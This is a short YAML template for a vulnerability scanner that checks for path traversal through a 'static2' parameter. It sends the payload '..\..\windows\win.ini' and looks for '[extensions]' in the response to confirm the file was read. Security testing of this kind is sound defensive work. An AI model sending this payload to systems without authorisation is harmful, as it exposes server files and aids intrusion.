id: lfi6-1118
name: 'Traversal in static2'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via static2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      static2:
        - '..\..\windows\win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
